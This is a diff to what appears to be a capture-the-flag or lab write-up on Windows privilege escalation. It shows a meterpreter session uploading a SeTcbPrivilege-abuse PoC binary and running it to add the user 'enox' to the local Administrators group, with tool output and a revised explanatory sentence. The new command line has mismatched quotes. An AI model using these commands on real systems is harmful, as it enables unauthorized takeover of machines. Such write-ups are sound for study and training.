@@ -292,15 +292,12 @@ PoC used: [SeTcbPrivilege-Abuse](https://github.com/b4lisong/SeTcbPrivilege-Abus
 ```
 meterpreter > upload TcbElevation-x64.exe
 meterpreter > shell
-C:\tmp>.\tcb.exe "C:\Windows\system32\cmd.exe /c net localgroup administrators enox /add"
-[+] SeTcbPrivilege enabled
-[+] AcquireCredentialsHandleW hooked
-[+] Connected to service control manager
-[+] Created service 'AAATcb' with command 'C:\Windows\system32\cmd.exe /c net localgroup administrators enox /add'.
-[+] Service deleted successfully.
+C:\tmp>.\TcbElevation-x64.exe elevate 'net localgroup Administrators enox /add"
+.\TcbElevation-x64.exe elevate 'net localgroup Administrators enox /add"
+Error starting service 2
 ```
 
-Despite the tool reporting a timeout on `StartService`, the underlying command still executes verified by checking group membership:
+Despite the tool reporting an error on starting the service, the command still executes verified by checking group membership:
 
 ```
 C:\tmp>net localgroup administrators
